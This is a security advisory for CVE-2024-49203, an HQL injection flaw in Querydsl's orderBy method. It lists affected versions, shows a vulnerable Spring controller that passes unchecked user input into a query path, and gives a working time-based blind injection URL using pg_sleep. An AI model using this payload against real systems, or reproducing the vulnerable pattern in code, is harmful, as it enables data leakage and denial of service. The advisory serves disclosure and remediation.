# [H] Querydsl vulnerable to HQL injection through orderBy

## Summary
Severity: High
Advisory: GHSA-6q3q-6v5j-h6vg
CVE: CVE-2024-49203
CWE: CWE-89
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L (CVSS_V3)
Published: 2024-11-27
Source: https://github.com/advisories/GHSA-6q3q-6v5j-h6vg
Type: github-advisory

## Affected
- Maven: `io.github.openfeign.querydsl:querydsl-jpa` — affected >=6.0.0.M1 <6.10.1
- Maven: `io.github.openfeign.querydsl:querydsl-apt` — affected >=6.0.0.M1 <6.10.1
- Maven: `io.github.openfeign.querydsl:querydsl-jpa` — affected >=0 <5.6.1
- Maven: `io.github.openfeign.querydsl:querydsl-apt` — affected >=0 <5.6.1
- Maven: `com.querydsl:querydsl-jpa` — affected >=0
- Maven: `com.querydsl:querydsl-apt` — affected >=0

## Details
### Summary
The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(https://github.com/querydsl/querydsl) where it was assigned preliminary CVE identifier **CVE-2024-49203**.

### Details
Vulnerable code may look as follows:
```
@GetMapping
public List<Test> getProducts(@RequestParam("orderBy") String orderBy) {
    JPAQuery<Test> query = new JPAQuery<Test>(entityManager).from(test);
    PathBuilder<Test> pathBuilder = new PathBuilder<>(Test.class, "test");

    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
    JPAQuery<Test> orderedQuery = query.orderBy(order);
    return orderedQuery.fetch();
}
```
Where vulnerability is either caused by ```pathBuilder.get(orderBy)``` or the ```orderBy(order)``` method itself, based on where the security checks are expected.

### PoC
Full POC code is available in repository:
https://github.com/CSIRTTrizna/CVE-2024-49203/
When we take a look at source code shown in Details section the functionality is as follows:

1) Create JPAQuery object instance:
```
JPAQuery<Test> query = new JPAQuery<Test>(entityManager).from(test);
```

2) Create OrderSpecifier object instance:
```
PathBuilder<Test> pathBuilder = new PathBuilder<>(Test.class, "test");
OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));
```
Where orderBy variable is user provided input.

3) order and run the query
```
JPAQuery<Test> orderedQuery = query.orderBy(order);
orderedQuery.fetch();
```

When user goes to URL 
```/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id```
The generated query will look something like this:
```
select test                                                                                                                                     
from Test test
order by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc
```

#### Environment

Library versions used in proof of concept to reproduce the vulnerability:
```
querydsl-jpa: 6.8.0
querydsl-apt: 6.8.0
hibernate-core: 6.1.1.Final
jakarta.persistence-api: 3.1.0
postgresql: 42.7.4
```

### Impact
The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.

## References
- https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg
- https://nvd.nist.gov/vuln/detail/CVE-2024-49203
- https://github.com/querydsl/querydsl/issues/3757
- https://github.com/CSIRTTrizna/CVE-2024-49203
- https://github.com/OpenFeign/querydsl
- https://github.com/OpenFeign/querydsl/releases/tag/5.6.1
- https://github.com/OpenFeign/querydsl/releases/tag/6.10.1
- https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0
- https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html
